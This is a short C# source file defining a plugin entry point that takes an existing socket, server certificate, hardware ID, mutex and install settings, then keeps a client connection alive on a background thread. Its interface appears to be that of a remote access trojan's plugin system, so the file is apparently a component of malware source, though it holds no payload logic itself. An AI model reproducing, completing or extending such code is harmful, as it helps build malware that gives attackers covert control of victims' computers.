using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Plugin
{
    public class Plugin
    {
        public static Socket Socket;
        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bdos, string install)
        {
            Debug.WriteLine("Plugin Invoked");
            Socket = socket;
            Connection.ServerCertificate = certificate;
            Connection.Hwid = hwid;
            new Thread(() =>
            {
                Connection.InitializeClient(msgPack);
            }).Start();

            while (Connection.IsConnected)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
